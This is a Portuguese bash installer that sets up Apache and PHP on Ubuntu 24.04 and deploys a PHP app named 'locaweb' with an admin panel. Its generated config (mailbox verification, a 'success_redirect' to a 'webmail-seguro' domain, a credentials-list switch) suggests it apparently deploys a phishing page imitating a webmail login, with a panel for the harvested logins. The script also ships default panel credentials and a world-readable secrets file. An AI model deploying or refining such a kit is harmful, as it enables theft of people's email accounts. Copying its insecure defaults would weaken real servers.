#!/bin/bash
# Ubuntu 24.04 — instala Apache + PHP e configura /var/www/html/teste
# Uso na VPS (como root ou sudo):
#   cd /var/www/html/teste && sudo bash deploy/install-ubuntu-24.sh
#
# URLs após instalar:
#   http://SEU_IP/teste/
#   http://SEU_IP/teste/panel/login.php

set -euo pipefail

APP_DIR="/var/www/html/teste"
WEB_USER="www-data"
PANEL_USER="${PANEL_USER:-Lima}"
PANEL_PASS="${PANEL_PASS:-Lima}"

if [[ "${EUID}" -ne 0 ]]; then
  echo "Execute com sudo: sudo bash deploy/install-ubuntu-24.sh"
  exit 1
fi

if [[ ! -f "${APP_DIR}/public/index.php" ]]; then
  echo "ERRO: Copie o projeto locaweb para ${APP_DIR} antes de rodar."
  echo "Ex.: rsync -av locaweb/ root@servidor:${APP_DIR}/"
  exit 1
fi

echo "==> Atualizando pacotes..."
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y -qq \
  apache2 \
  php \
  php-cli \
  php-json \
  php-mbstring \
  php-xml \
  php-curl \
  php-zip \
  libapache2-mod-php \
  unzip \
  curl

echo "==> Módulos Apache..."
a2enmod rewrite headers env
a2enconf locaweb-teste 2>/dev/null || true

echo "==> Config Apache /teste..."
install -m 644 "${APP_DIR}/deploy/apache-teste.conf" /etc/apache2/conf-available/locaweb-teste.conf
a2enconf locaweb-teste

echo "==> config.local.php..."
if [[ ! -f "${APP_DIR}/config.local.php" ]]; then
  if [[ -z "${PANEL_PASS}" ]]; then
    PANEL_PASS="$(openssl rand -base64 12 | tr -d '/+=' | head -c 16)"
  fi
  cat > "${APP_DIR}/config.local.php" <<EOF
<?php
declare(strict_types=1);
\$cfg = require __DIR__ . '/config.example.php';
\$cfg['env'] = 'production';
\$cfg['base_url'] = 'http://' . (\$_SERVER['HTTP_HOST'] ?? 'localhost') . '/teste';
\$cfg['url_prefix'] = '/teste';
\$cfg['mailbox_verify'] = true;
\$cfg['success_redirect'] = 'https://webmail-seguro.com.br/';
\$cfg['data_dir'] = __DIR__ . '/var/data';
\$cfg['allow_credentials_list'] = false;
\$cfg['panel_user'] = '${PANEL_USER}';
\$cfg['panel_pass'] = '${PANEL_PASS}';
\$cfg['panel_reset_key'] = '$(openssl rand -hex 16)';
return \$cfg;
EOF
  chmod 644 "${APP_DIR}/config.local.php"
  echo "    Criado config.local.php (senha painel gerada — veja ao final)."
else
  echo "    config.local.php já existe — garantindo url_prefix /teste..."
  sed -i "s|'url_prefix'[[:space:]]*=>[[:space:]]*'[^']*'|'url_prefix' => '/teste'|" "${APP_DIR}/config.local.php" || true
  PANEL_PASS="(já configurada)"
fi

echo "==> Permissões..."
mkdir -p "${APP_DIR}/var/data" "${APP_DIR}/var/rate"
chown -R "${WEB_USER}:${WEB_USER}" "${APP_DIR}"
find "${APP_DIR}" -type d -exec chmod 755 {} \;
find "${APP_DIR}" -type f -exec chmod 644 {} \;
chmod 755 "${APP_DIR}/var" "${APP_DIR}/var/data" deploy/install-ubuntu-24.sh 2>/dev/null || true
chmod -R 775 "${APP_DIR}/var/data" "${APP_DIR}/var/rate"
chmod 644 "${APP_DIR}/config.local.php" 2>/dev/null || true

echo "==> Teste sintaxe PHP..."
php -l "${APP_DIR}/public/index.php" >/dev/null
php -l "${APP_DIR}/panel/index.php" >/dev/null

echo "==> Reiniciando Apache..."
systemctl enable apache2
systemctl restart apache2

SERVER_IP="$(hostname -I 2>/dev/null | awk '{print $1}')"
echo ""
echo "=============================================="
echo " INSTALAÇÃO CONCLUÍDA"
echo "=============================================="
echo " Site:   http://${SERVER_IP:-SEU_IP}/teste/"
echo " Painel: http://${SERVER_IP:-SEU_IP}/teste/panel/login.php"
echo " Usuário painel: ${PANEL_USER}"
if [[ "${PANEL_PASS}" != "(já configurada)" ]]; then
  echo " Senha painel:   ${PANEL_PASS}"
  echo " (guarde — também está em config.local.php)"
fi
echo ""
echo " Reset painel (emergência):"
echo "   curl \"http://${SERVER_IP:-SEU_IP}/teste/panel/reset_painel.php?key=CHAVE\""
echo "   (CHAVE = panel_reset_key em config.local.php)"
echo "=============================================="
